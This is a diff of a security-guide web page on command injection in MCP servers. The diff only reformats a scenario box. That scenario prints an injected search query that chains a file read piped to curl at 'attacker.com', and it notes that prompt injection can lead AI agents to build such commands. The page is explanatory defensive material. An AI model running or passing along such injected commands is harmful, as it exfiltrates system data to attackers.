@@ -1020,14 +1020,14 @@
 <h1 id="mcp05-command-injection-execution">MCP05: Command Injection &amp; Execution<a class="headerlink" href="#mcp05-command-injection-execution" title="Permanent link">¶</a></h1>
 <h3 id="azure-implementation-full">Azure Implementation: FULL<a class="headerlink" href="#azure-implementation-full" title="Permanent link">¶</a></h3>
 <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/mcp05-scenario.png" data-desc-position="bottom"><img alt="MCP05 Scenario" src="../../images/mcp05-scenario.png"></a></p>
-<blockquote>
-<p><strong>Real-World Scenario</strong>: The Innocent Search Request</p>
+<div class="admonition tip">
+<p class="admonition-title">Real-World Scenario: The Innocent Search Request</p>
 <p>An MCP server provides a tool for searching log files. A user asks: “Search the logs for errors from yesterday.”</p>
 <p>The MCP sever constructs a command like: <code>grep ‘errors’ /var/log/app.log</code>. But what if the user (or attacker using prompt injection) asks:</p>
 <p>“Search logs for errors; <code>cat /etc/password \| curl attacker.com</code>”?</p>
 <p>If the server concatenates this input directly into a shell command, the attacker just exfiltrated your system’s user list.</p>
 <p><strong>Think of it like</strong>: A vending machine where you type what you want. Normally you type “A1” for chips. But if the machine accepts any input and passes it directly to its internal system, typing “A1, open cash drawer” might do exactly what it says.</p>
-</blockquote>
+</div>
 <h2 id="understanding-the-risk">Understanding the Risk<a class="headerlink" href="#understanding-the-risk" title="Permanent link">¶</a></h2>
 <p>Command injection happens when user input is incorporated into system commands without proper sanitization. MCP servers that execute commands, run scripts, or interact with the operating system are particularly vulnerable. Because AI agents construct these commands based on natural language requests, attackers can craft prompts that result in dangerous command strings.</p>
 <h2 id="the-azure-solution">The Azure Solution<a class="headerlink" href="#the-azure-solution" title="Permanent link">¶</a></h2>
